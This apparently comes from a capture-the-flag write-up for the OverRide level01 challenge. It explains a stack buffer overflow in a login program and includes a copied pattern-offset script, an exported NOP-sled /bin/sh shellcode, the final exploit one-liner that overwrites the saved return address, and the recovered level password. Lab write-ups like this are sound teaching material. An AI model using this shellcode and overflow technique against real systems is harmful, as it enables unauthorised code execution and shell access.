## level01 (stack buffer overflow)
```clike=
static char input_buf[256];

int verify_user_name()
{
    puts("verifying username....");
    return strcmp(input_buf, "dat_wil");
}

int verify_user_pass(char *input)
{
    return strcmp(input, "admin");
}

int main()
{
    char buf1[64]; // 92 - 28
    int num;
    
    memset(buf1, 0, 16);
    num = 0;
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username:");
    fgets(input_buf, 256, stdin);
    num = verify_user_name();
    if (num != 0)
    {
        puts("nope, incorrect username");
        return 1;
    }
    puts("Enter Password:");
    fgets(buf1, 100, stdin);
    num = verify_user_pass(buf1);
    if (num != 0)
    {
        puts("nope, incorrect password");
        return 1;
    }
    return 0;
}
```

Looking at the surface, it looks like guessing the password wont help us acheive our goal. In the buffer to store the password, it looks like fgets is reading more characters than the buf1 can handle, which might be vulnerable to a buffer overflow.

I have found this python program below to help us determine the buffer overflow offset with a pattern, it is like follows.
```python=
#!/usr/bin/env python

# https://github.com/Svenito/exploit-pattern/blob/master/pattern.py
import sys

try:
    import clipboard
except ImportError:
    pass
from string import ascii_uppercase, ascii_lowercase, digits

MAX_PATTERN_LENGTH = 20280


class MaxLengthException(Exception):
    pass


class WasNotFoundException(Exception):
    pass


def pattern():
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                yield upper + lower + digit


def pattern_gen(length):
    """
    Generate a pattern of a given length up to a maximum
    of 20280 - after this the pattern would repeat
    """
    if length > MAX_PATTERN_LENGTH:
        raise MaxLengthException(
            "ERROR: Pattern length exceeds maximum of {0}".format(MAX_PATTERN_LENGTH)
        )

    result = ""
    for p in pattern():
        if len(result) < length:
            result += p
        else:
            return result[:length]

    # If we end up here we've exhausted all characters so truncate the pattern
    return result[:length]


def pattern_search(search_pattern):
    """
    Search for search_pattern in pattern. Convert from hex if needed
    Looking for needle in haystack
    """
    needle = search_pattern

    try:
        if needle.startswith("0x"):
            # Strip off '0x', convert to ASCII and reverse
            needle = needle[2:]
            needle = bytearray.fromhex(needle).decode("ascii")
            needle = needle[::-1]
    except (ValueError, TypeError) as e:
        raise

    haystack = ""
    for p in pattern():
        haystack += p
        found_at = haystack.find(needle)
        if found_at > -1:
            return found_at

    raise WasNotFoundException(
        "Couldn`t find {0} ({1}) "
        "anywhere in the pattern.".format(search_pattern, needle)
    )


def print_help():
    print("Usage: {0} [LENGTH|PATTERN]\n".format(sys.argv[0]))
    print("Generate a pattern of length LENGTH or search for PATTERN and ")
    print("return its position in the pattern.\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_help()
        sys.exit(0)

    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        print_help()
        sys.exit(0)

    if sys.argv[1].isdigit():
        try:
            pat = pattern_gen(int(sys.argv[1]))
            try:
                clipboard.copy(pat)
                print("Pattern copied to clipboard: \n")
            except NameError:
                pass

            print(pat)

        except MaxLengthException as e:
            print(e)
    else:
        try:
            found = pattern_search(sys.argv[1])
            print(
                "Pattern {0} first occurrence at "
                "position {1} in pattern.".format(sys.argv[1], found)
            )
        except WasNotFoundException as e:
            print(e)
            sys.exit(1)
        except (ValueError, TypeError):
            print("Unable to convert hex input for searching. Invalid hex?")
            sys.exit(1)
```
I generated a pattern with the following output and I tried running it in the program. As you can see , the saved EIP for changed after the fgets call.
```
level01@OverRide:/tmp$ python pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

![image](https://hackmd.io/_uploads/S1dLaEwIa.png)

I used the same program to find the position of the offset, and it is at 80 bytes.
```
level01@OverRide:~$ python /tmp/pattern.py 6Ac7
Pattern 6Ac7 first occurrence at position 80 in pattern.
level01@OverRide:~$
```

I used a shellcode from the site `https://shell-storm.org/shellcode/index.html` and I generated a payload. I also put the shellcode in the environment variable so that it can be jumped to by the saved EIP.

I saved the shellcode in the env like so ;
```
 export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
 ```

Then, I need to get the address of the environment variables for the EIP to jump to. I used the `x/s *((char **)environ)` command in GDB and got the following output. As we can see, we have the address to our shellcode. I have added 20 to the final input because gdb has set **some env vars that might affect the accuracy of this reading**.
![image](https://hackmd.io/_uploads/S1yqYSPIT.png)

```
(python -c 'print "dat_wil" + "\n" + "B" * 80 + "\x81\xd8\xff\xff"'; cat) | ./level01
```

![image](https://hackmd.io/_uploads/SJoD_rDU6.png)

`PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv` is the password.

